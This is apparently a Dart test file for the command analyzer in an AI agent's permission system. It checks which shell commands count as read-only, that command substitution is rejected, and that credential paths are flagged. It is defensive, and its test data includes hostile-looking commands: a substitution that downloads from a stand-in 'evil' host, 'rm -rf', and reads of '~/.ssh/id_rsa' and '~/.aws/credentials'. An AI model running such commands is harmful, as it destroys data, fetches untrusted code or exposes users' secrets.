import 'package:athena_core/agent/permission/command_analyzer.dart';
import 'package:test/test.dart';

void main() {
  group('CommandAnalyzer.extractAction', () {
    test('extracts first word as action', () {
      expect(CommandAnalyzer.extractAction('git status'), 'git');
      expect(CommandAnalyzer.extractAction('ls -la'), 'ls');
      expect(CommandAnalyzer.extractAction('npm install foo'), 'npm');
      expect(CommandAnalyzer.extractAction('  dart  analyze  '), 'dart');
    });

    test('returns null for empty or composite commands', () {
      expect(CommandAnalyzer.extractAction(''), isNull);
      expect(CommandAnalyzer.extractAction('   '), isNull);
      // 管道 / 分隔符 → 降级
      expect(CommandAnalyzer.extractAction('ls | head'), isNull);
      expect(CommandAnalyzer.extractAction('cd a && npm i'), isNull);
      expect(CommandAnalyzer.extractAction('git status; git log'), isNull);
    });
  });

  group('CommandAnalyzer.isReadOnlyCommand', () {
    test('read-only whitelist commands', () {
      for (final cmd in [
        'ls',
        'ls -la',
        'cat README.md',
        'grep -rn "foo" lib/',
        'head -20 file.txt',
        'tail -f app.log',
        'pwd',
        'which dart',
        'whoami',
        'git status',
        'git status -s',
        'git log --oneline',
        'git diff',
        'npm list',
        'npm list --depth=0',
        'find . -name "*.dart"',
      ]) {
        expect(
          CommandAnalyzer.isReadOnlyCommand(cmd),
          isTrue,
          reason: 'expected read-only: $cmd',
        );
      }
    });

    test('side-effect commands are not read-only', () {
      for (final cmd in [
        'git push',
        'git commit -m "x"',
        'git checkout main',
        'npm install',
        'npm run build',
        'rm file.txt',
        'rm -rf dir',
        'mkdir -p /tmp/x',
        'mv a b',
        'touch file',
        'curl https://example.com -o out.html',
        'find . -delete',
        'find . -exec rm {} \\;',
        'ls -la > out.txt',
        'cat file >> log',
        'ls | grep foo',
        'git status && git push',
      ]) {
        expect(
          CommandAnalyzer.isReadOnlyCommand(cmd),
          isFalse,
          reason: 'expected side-effect: $cmd',
        );
      }
    });

    test('command substitution / expansion is never read-only', () {
      // $() 与反引号内的任意命令会在 shell 中先执行,只读判定必须拒绝
      for (final cmd in [
        r'echo $(git push --force)',
        r'echo $(rm -rf /tmp/x)',
        r'ls $(npm install -g evil)',
        r'git log --format=$(curl -o /tmp/x http://evil/x)',
        r'echo `rm -f /tmp/x`',
        r'echo $PATH',
        r'echo ${PATH}',
        r'cat $(ls ~/.ssh)',
      ]) {
        expect(
          CommandAnalyzer.isReadOnlyCommand(cmd),
          isFalse,
          reason: 'expected not read-only: $cmd',
        );
      }
    });

    test('sensitive paths are never read-only even in whitelist', () {
      for (final cmd in [
        'cat ~/.ssh/id_rsa',
        'cat ~/.ssh/authorized_keys',
        'cat ~/.aws/credentials',
        'cat /home/u/proj/.env',
        'cat .env.local',
        'grep secret ~/.athena/permissions.json',
        'ls ~/.aws/',
      ]) {
        expect(
          CommandAnalyzer.isReadOnlyCommand(cmd),
          isFalse,
          reason: 'expected not read-only (sensitive): $cmd',
        );
      }
    });

    test('containsSensitivePath detects credential paths', () {
      expect(CommandAnalyzer.containsSensitivePath('cat ~/.ssh/id_rsa'),
          isTrue);
      expect(CommandAnalyzer.containsSensitivePath('cat ~/.aws/credentials'),
          isTrue);
      expect(CommandAnalyzer.containsSensitivePath('cat README.md'), isFalse);
      expect(CommandAnalyzer.containsSensitivePath('ls lib/src'), isFalse);
    });
  });

  group('CommandAnalyzer.parseRulePattern', () {
    test('splits action and pattern', () {
      expect(CommandAnalyzer.parseRulePattern('git *'),
          (action: 'git', pattern: '*'));
      expect(CommandAnalyzer.parseRulePattern('git'),
          (action: 'git', pattern: ''));
      expect(CommandAnalyzer.parseRulePattern('npm install *'),
          (action: 'npm', pattern: 'install *'));
    });

    test('non-shell input falls back to plain pattern', () {
      expect(CommandAnalyzer.parseRulePattern('/a/b/'),
          (action: null, pattern: '/a/b/'));
      expect(CommandAnalyzer.parseRulePattern('https://a.com'),
          (action: null, pattern: 'https://a.com'));
      expect(CommandAnalyzer.parseRulePattern(''),
          (action: null, pattern: ''));
    });

    test('composite command falls back to plain pattern', () {
      expect(CommandAnalyzer.parseRulePattern('ls | head'),
          (action: null, pattern: 'ls | head'));
    });

    test('exact-call pattern parses to action-level rule', () {
      // 弹窗 "Exactly this call" 对 shell 存 'git push *' → 动作级规则
      expect(CommandAnalyzer.parseRulePattern('git push *'),
          (action: 'git', pattern: 'push *'));
      expect(CommandAnalyzer.parseRulePattern('npm install *'),
          (action: 'npm', pattern: 'install *'));
    });
  });
}
